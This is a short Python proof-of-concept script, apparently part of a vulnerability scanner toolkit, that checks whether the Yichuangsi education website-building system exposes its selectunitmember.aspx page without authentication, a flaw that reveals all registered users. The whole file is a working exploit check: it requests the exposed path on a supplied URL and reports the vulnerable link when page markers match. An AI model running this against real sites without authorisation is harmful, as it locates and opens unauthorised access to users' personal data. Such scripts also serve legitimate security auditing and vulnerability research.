#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 易创思教育建站系统未授权访问可查看所有注册用户
referer: http://www.wooyun.org/bugs/wooyun-2010-086704
author: Lucifer
description: 文件selectunitmember.aspx未授权访问。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class esccms_selectunitmember_unauth:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/operationmanage/selectunitmember.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"doPostBack" in req.text and r"gvUnitMember" in req.text:
                printGreen("[+]Success:存在易创思教育建站系统未授权漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在esccms_selectunitmember_unauth漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = esccms_selectunitmember_unauth(sys.argv[1])
    testVuln.run()